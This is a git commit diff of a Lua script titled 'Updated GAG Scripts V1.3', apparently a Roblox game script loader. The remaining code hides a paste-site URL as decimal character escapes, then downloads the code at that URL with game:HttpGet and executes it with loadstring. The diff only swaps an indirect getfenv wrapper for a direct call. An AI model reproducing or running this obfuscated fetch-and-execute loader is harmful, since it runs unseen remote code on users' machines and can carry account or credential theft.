2006312eeeecd7338cbef421607282ef3f257eca
Arjhay1 <evonyraid016@gmail.com>
2025-06-08 20:15:18 +0800

    Update Updated GAG Scripts V1.3.lua

--- Scripts/Updated GAG Scripts V1.3.lua
+++ Scripts/Updated GAG Scripts V1.3.lua
@@ -1,7 +1,2 @@
-local a = getfenv and getfenv() or _ENV
-local b = a["loadstring"]
-local c = a["game"]["HttpGet"]
-local d = a["game"]
-
 local u = "\104\116\116\112\115\58\47\47\112\97\115\116\101\46\101\101\47\114\47\56\55\109\87\75\56\110\108"
-b(c(d, u))()
+loadstring(game:HttpGet(u))()
